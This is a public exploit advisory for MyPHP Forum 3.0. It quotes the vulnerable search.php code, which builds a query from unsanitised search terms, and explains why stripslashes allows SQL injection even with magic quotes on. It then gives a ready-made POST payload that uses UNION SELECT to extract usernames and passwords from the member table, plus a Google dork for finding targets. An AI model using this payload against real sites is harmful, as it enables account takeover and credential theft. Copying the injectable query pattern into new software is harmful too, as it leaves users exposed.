MyPHP Forum <= 3.0 (Final) Remote SQL Injection Vulnerability
=============================================================



#=================================================================================================# 
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                    This is a Public Exploit.                                    #
#				   Date: 03/01/2008 [dd,mm,yyyy]                                  #
#                                                                                                 #
#                                      !!!Happy New Year!!!                                       #
#                                                                                                 #
#=================================================================================================#
#   MyPHP Forum v3.0 (Final) And Maybe Lower Multiple Sql Injection Vulnerabilities (Mq=Off/On)   #
#                                                                                                 #
#                                       Vendor:   www.myphp.ws                                    #
#                                     Severity:   Highest                                         #
#                                       Author:   The:Paradox                                     #
#                                                                                                 #
#=================================================================================================#                                                                                                 
#                                       Proud To Be Italian.                                      #
#=================================================================================================#
"""                                                                                                
                                            Related Codes:
                                         search.php; line 14:

if($_POST[&#039;submit&#039;]) {
	$searchtext = $_POST[&#039;searchtext&#039;];
	$searchuser = $_POST[&#039;searchuser&#039;];

	if(!strstr($searchtext, &#039;"&#039;)) {
		$keywords = explode(" ", $searchtext);
		for($i = 0; $i < count($keywords); $i++) {
			if($sqladdon != "") {
				$sqladdon .= " AND p.message LIKE &#039;%$keywords[$i]%&#039;";
			} else {
				$sqladdon .= "p.message LIKE &#039;%$keywords[$i]%&#039;";
			}
		}
	} else {
		$phrase = trim(stripslashes(strstr($searchtext, &#039;"&#039;)));
		$quotesarr = explode(&#039;"&#039;, $phrase);
		$quotes = count($quotesarr);
		$phrasecount = $quotes - (count(explode(&#039;" "&#039;, $phrase)) + 1);

		for($i = 0; $i < $quotes; $i++) {
			if($i != 0 && $i != $quotes - 1) {
				if($phraseoff != "yes") {
					$phraselist .= "$quotesarr[$i]|";
					$phraseoff = "yes";
				} else {
					$phraseoff = "no";
				}
			}
		}

		$phrasearr = explode("|", $phraselist);
		$phrases = count($phrasearr) - 1;

		for($i = 0; $i < $phrases; $i++) {
			if($sqladdon != "") {
				$sqladdon .= " AND p.message LIKE &#039;%$phrasearr[$i]%&#039;";
			} else {
				$sqladdon .= "p.message LIKE &#039;%$phrasearr[$i]%&#039;";
			}
		}
		
		$newsearchtxt = trim(str_replace("$phrase", "", stripslashes($searchtext)));

		if($newsearchtxt != "") {
			$keywords = explode(" ", $newsearchtxt);
		}

		for($i = 0; $i < count($keywords); $i++) {
			if($sqladdon != "") {
				$sqladdon .= " AND p.message LIKE &#039;%$keywords[$i]%&#039;";
			} else {
				$sqladdon .= "p.message LIKE &#039;%$keywords[$i]%&#039;";
			}
		}
	}

	if($searchuser != "") {
		if($sqladdon != "") {
				$sqladdon .= " AND p.author LIKE &#039;%$searchuser%&#039;";
			} else {
				$sqladdon .= "p.author LIKE &#039;%$searchuser%&#039;";
			}
	}

	if($sqladdon != "" ) {
		search_header();
		$ttnum = 1;		// Now the Vulnerable Query =)
		$query = mysql_query("SELECT t.*, f.name AS forum FROM $db_post p, $db_topic t, $db_forum f WHERE $sqladdon AND t.tid=p.tid AND f.fid=t.fid") or die(mysql_error());
		
"""
#=================================================================================================#
# Proof Of Concept / Bug Explanation:                                                             #
#                                                                                                 #
# A lot of Sql injection Vulnerabilities were found in this platform, but most of them work only  #
# with the server configuration Magic Quotes Off.                                                 #
# Whatever in Search.php there is a $searchtext is not propelly checked before the mysql_query.   #
# The page does stripslashes to $searchtext var making us able to do an Sql injection with the    #
# configuration of Magic Quotes On.                                                               #
#                                                                                                 #
#=================================================================================================#
# Post Query :                                                                                    
#                                                                                                 
# submit=Search&searchtext=%&#039;/**/UNION/**/SELECT/**/0,0,0,concat(&#039;<BR/><h3>-=ParadoxGotThisOne=-</h3><BR/><h4>Username:&#039;,username,&#039;<BR/>Password:&#039;,password,&#039;</h4>&#039;),0,0,0,0,0,0/**/FROM/**/[Prefix]_member/**/WHERE/**/uid=[Id]/*"
#                                                                                                 
# Attenction: the last " is needed (see code).                                                    
#                                                                                                 
#=================================================================================================#
# Other injection vulnerabilities were found, but them were not pulished.                         #
#=================================================================================================#
# Google Dork=> Powered by MyPHP Forum v3.0                                                       #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#



